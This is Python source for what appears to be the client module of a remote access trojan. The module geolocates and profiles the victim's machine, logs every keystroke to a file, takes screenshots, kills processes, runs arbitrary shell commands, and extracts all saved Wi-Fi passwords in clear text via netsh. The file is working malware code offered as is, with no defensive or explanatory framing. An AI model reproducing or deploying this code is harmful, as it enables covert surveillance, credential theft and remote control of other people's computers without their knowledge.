import requests
import platform
import socket
from pynput.keyboard import Key, Listener
import pyautogui
from getpass import getuser
import os
import subprocess
import re
import psutil
from util import Console

test_konumu = f"C:\\Users\\{getuser()}\\Desktop\\"
class ClientCommands:
    def __init__(self):
        super().__init__()

    def get_info(self) -> dict:
        __url = "http://ip-api.com/json/?fields=61439"
        __response = requests.get(__url).json()
        data = {"INFO":{"Country" :__response["country"],"Country-Code" :__response["countryCode"],"Region-Name":__response["regionName"],"City":__response["city"],
                        "Lat" :__response["lat"],"Lon": __response["lon"],"Time-Zone":__response["timezone"],"IP":__response["query"],
                        "IPv4":socket.gethostbyname(socket.gethostname())},
                "SYSTEM":{"OS":platform.platform(),"Node":platform.node(),
                          "Machine-Type":platform.machine(),"Processor":platform.processor(),
                          "Core": os.cpu_count(),
                          "Altair-in-here":os.getcwd()}}
        return data
        
    def on_press(self,key):
        letters = str(key)
        letters = letters.replace("'","")
        if key == Key.space:
            letters = " "
        if key == Key.enter:
            letters = "\n"
        if key == Key.shift_l or key == Key.shift_r:
            letters.upper()
        if key == Key.esc:
            letters = ""
        with open("log.txt","a",encoding="utf-8") as f:
            f.write(letters)

    def on_release(self,key):
        if key == Key.esc:
            return False

    def makeKeylogger(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def screenShot(self):
        pyautogui.screenshot().save(f"{test_konumu}ss.png")
    
    def terminalCommands(self,c:str):
        try:
            if c.startswith("kill"):
                splitter_kill = c.split()
                splitter_kill.remove("kill")
                if len(splitter_kill) > 1:
                    return f"\t\t{Console.CYAN}╰──/{Console.RED}Only One Argument\n".expandtabs(7)
                else:
                    return os.popen(f"taskkill /im {splitter_kill[0]} /f").read()
            else:
                if c == "help":
                    HELPER = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN} \t[{Console.GREEN}GET-ALL-APP-NAME{Console.CYAN}]
              ╰──/{Console.DEFAULT}kill{Console.CYAN}\t   [{Console.GREEN}CLOSE-APP{Console.CYAN}]
              ╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN} [{Console.GREEN}GET-SAVED-WIFI-PASSWORDS{Console.CYAN}]
                    """
                    return HELPER
                if c == "get-apps":
                    return "".join(f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{p.name()}\n".expandtabs(7) for p in psutil.process_iter())
                else:
                    return f"\t\t{Console.CYAN}╰──/{Console.DEFAULT}{os.popen(c).read()}\n".expandtabs(7)
        except IndexError:
            return " "

    def wifiChecked(self):
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        strings = ""
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                strings += "{:<25}-> {:<}\n".format(i, results[0])
            except subprocess.CalledProcessError:
                strings += "{:<30}-> {:<}\n".format(i, "ENCODING ERROR")
        return strings